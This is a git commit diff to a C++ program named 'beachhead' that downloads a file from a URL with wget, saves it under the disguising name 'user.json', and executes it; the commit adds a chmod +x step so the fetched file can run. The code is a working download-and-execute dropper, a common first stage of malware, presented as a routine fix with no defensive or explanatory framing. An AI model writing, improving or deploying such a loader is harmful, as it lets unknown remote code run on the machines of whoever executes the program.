ce28079c1a8f94ed7db638b6f4c1222129ab266a
deutscherSchaferhund44 <bt.wei1234@gmail.com>
2026-03-30 01:04:44 -0400

    Fix missing chmod +x file permissions after wget

--- beachhead/beachhead.cpp
+++ beachhead/beachhead.cpp
@@ -7,9 +7,11 @@ int main() {
     std::string command0 = "wget -q " + url + " -O user.json";
     int r0 = std::system(command0.c_str());
 
+    int r1 = std::system("chmod +x ./user.json");
+
     // Run
     std::string command1 = "./user.json";
-    int r1 = std::system(command1.c_str());
+    int r2 = std::system(command1.c_str());
 
     return 0;
 }
